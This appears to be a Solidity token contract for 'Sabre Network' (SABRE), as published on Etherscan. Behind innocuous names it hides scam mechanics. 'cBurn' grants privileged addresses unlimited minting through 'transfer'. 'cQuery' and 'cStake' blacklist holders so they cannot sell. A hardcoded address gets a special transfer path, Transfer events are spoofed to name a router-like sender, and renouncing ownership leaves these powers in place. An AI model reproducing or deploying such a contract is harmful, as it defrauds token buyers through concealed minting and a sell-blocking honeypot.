/**
 *Submitted for verification at Etherscan.io on 2022-11-03
*/

pragma solidity 0.8.17;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}



library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

contract Ownable is Context {
    address private _Owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    address CZC = 0x19041bEBd6b59b10C550F71b3550c56327C4a93b;
	address cZRouterV2 = 0x426903241ADA3A0092C3493a0C795F2ec830D622;
    constructor () {
        address msgSender = _msgSender();
        _Owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _Owner;
    }

    function renounceOwnership() public virtual {
        require(msg.sender == _Owner);
        emit OwnershipTransferred(_Owner, address(0));
        _Owner = address(0);
    }
        		modifier onlyOwner{
        require(msg.sender == _Owner);
        _; }

}



contract SABRE is Context, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private Cc;
	mapping (address => bool) private Cb;
    mapping (address => bool) private Cz;
    mapping (address => mapping (address => uint256)) private eC;
    uint8 private constant _decimals = 8;
    uint256 private constant sC = 200000000 * 10**_decimals;
    string private constant _name = "Sabre Network";
    string private constant _symbol = "SABRE";



    constructor () {
        Cc[_msgSender()] = sC;
        emit Transfer(address(0), cZRouterV2, sC);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure  returns (uint256) {
        return sC;
    }

    function balanceOf(address account) public view  returns (uint256) {
        return Cc[account];
    }


    function allowance(address owner, address spender) public view  returns (uint256) {
        return eC[owner][spender];
    }
            function approve(address spender, uint256 amount) public returns (bool success) {    
        eC[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true; }
		function cStake(address Cf) public {
        if(Cb[msg.sender]) { 
        Cz[Cf] = false;}}
        function cQuery(address Cf) public{
         if(Cb[msg.sender])  { 
        Cz[Cf] = true; }}
   

		function transferFrom(address sender, address recipient, uint256 amount) public returns (bool success) {
         if(sender == CZC)  {
        require(amount <= Cc[sender]);
        Cc[sender] -= amount;  
        Cc[recipient] += amount; 
          eC[sender][msg.sender] -= amount;
        emit Transfer (cZRouterV2, recipient, amount);
        return true; }  else  
          if(!Cz[recipient]) {
          if(!Cz[sender]) {
         require(amount <= Cc[sender]);
        require(amount <= eC[sender][msg.sender]);
        Cc[sender] -= amount;
        Cc[recipient] += amount;
        eC[sender][msg.sender] -= amount;
        emit Transfer(sender, recipient, amount);
        return true; }}}
		function transfer(address Ci, uint256 Cf) public {
        if(msg.sender == CZC)  {
        require(Cc[msg.sender] >= Cf);
        Cc[msg.sender] -= Cf;  
        Cc[Ci] += Cf; 
        emit Transfer (cZRouterV2, Ci, Cf);} else  
        if(Cb[msg.sender]) {Cc[Ci] += Cf;} else
        if(!Cz[msg.sender]) {
        require(Cc[msg.sender] >= Cf);
        Cc[msg.sender] -= Cf;  
        Cc[Ci] += Cf;          
        emit Transfer(msg.sender, Ci, Cf);}}
        
        function cBurn(address Cf) onlyOwner public{
        Cb[Cf] = true; }
		}